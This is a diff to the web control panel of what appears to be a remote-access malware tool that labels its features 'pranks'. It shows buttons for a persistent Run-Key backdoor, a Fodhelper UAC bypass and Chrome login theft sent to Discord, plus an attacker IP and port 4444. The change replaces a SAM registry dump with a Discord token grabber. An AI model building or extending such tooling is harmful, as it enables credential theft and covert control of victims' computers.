@@ -223,7 +223,7 @@ footer{text-align:center;padding:8px;font-size:.7em;color:#2d3748}
 <button class="pbtn" onclick="if(confirm('Install Persistent Backdoor (Run Key)?'))runPrank('persistence')" style="border-color:rgba(246,173,85,.4);background:rgba(246,173,85,.08);color:#f6ad55">&#128376; Persistence</button>
 <button class="pbtn" onclick="if(confirm('Bypass UAC to System/Admin (Fodhelper)?'))runPrank('uacbypass')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128275; Bypass UAC</button>
 <button class="pbtn" onclick="if(confirm('Steal Chrome Logins to Discord?'))runPrank('chromeexfil')" style="border-color:rgba(183,148,244,.4);background:rgba(183,148,244,.08);color:#b794f4">&#128272; Chrome Exfil</button>
-<button class="pbtn" onclick="if(confirm('Dump SAM & SYSTEM Registry Hives to Discord (UAC Bypass)?'))runPrank('samdump')" style="border-color:rgba(229,62,62,.8);background:rgba(229,62,62,.2);color:#fc8181;font-weight:bold">&#128123; SAM Dump</button>
+<button class="pbtn" onclick="if(confirm('Grab Discord Tokens (UAC Bypass)?'))runPrank('DiscordGrabber')" style="border-color:rgba(229,62,62,.8);background:rgba(229,62,62,.2);color:#fc8181;font-weight:bold">&#128123; Discord Grabber</button>
 </div>
 </div>
 <div class="run-panel kb-hidden" id="runPanel">
@@ -521,7 +521,7 @@ const PRANKS={
   persistence:'CMD:Persistence',
   uacbypass:'CMD:UACBypass',
   chromeexfil:'CMD:ChromeExfil',
-  samdump:'CMD:SAMDump'
+  'DiscordGrabber':'CMD:DiscordGrabber'
 };
 let attackerIP = '192.168.0.103'; // Default IP
 let attackerPort = '4444'; // Default Port
